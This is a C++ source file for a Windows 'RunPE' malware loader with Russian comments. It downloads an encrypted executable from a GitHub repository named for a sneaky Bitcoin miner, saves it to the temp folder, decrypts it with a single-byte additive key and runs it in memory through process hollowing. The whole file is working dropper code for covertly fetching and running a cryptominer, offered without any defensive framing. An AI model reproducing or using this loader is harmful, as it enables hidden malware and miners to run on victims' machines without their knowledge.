// Non-resident RunPE Loader.cpp: определяет точку входа для приложения.
//

#include "stdafx.h"
#include "Non-resident RunPE Loader.h"
#include "urlmon.h"
#include "RunPe.h"
#include <string>
#pragma comment (lib, "urlmon.lib")
void DownloadFile(LPCWSTR szUrl, char *filename) {
	
	wchar_t wtext[MAX_PATH];
	mbstowcs(wtext, filename, strlen(filename) + 1);
	LPCWSTR dwlndTo = wtext;
	URLDownloadToFile(NULL, szUrl, dwlndTo, 0, NULL);
}

void DecryptAndRun(char *path, unsigned char key)
{
	FILE * file = fopen(path, "rb");
	fseek(file, 0, SEEK_END);
	long int size = ftell(file);
	fclose(file);
	file = fopen(path, "rb");
	unsigned char * in = (unsigned char *)malloc(size);
	int bytes_read = fread(in, sizeof(unsigned char), size, file);
	fclose(file);
	for (int i = 0; i < size; i++)
	{
		in[i] += key;
	}
	RunPortableExecutable(in);
}

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPWSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
	char *filename = strcat(getenv("temp"), "\\pld.exe");
	DownloadFile(L"http://github.com/ims0rry/Sneaky_btc_miner_winx86/raw/master/out.exe", filename);
	DecryptAndRun(filename, 0x56);
	return 0;
}
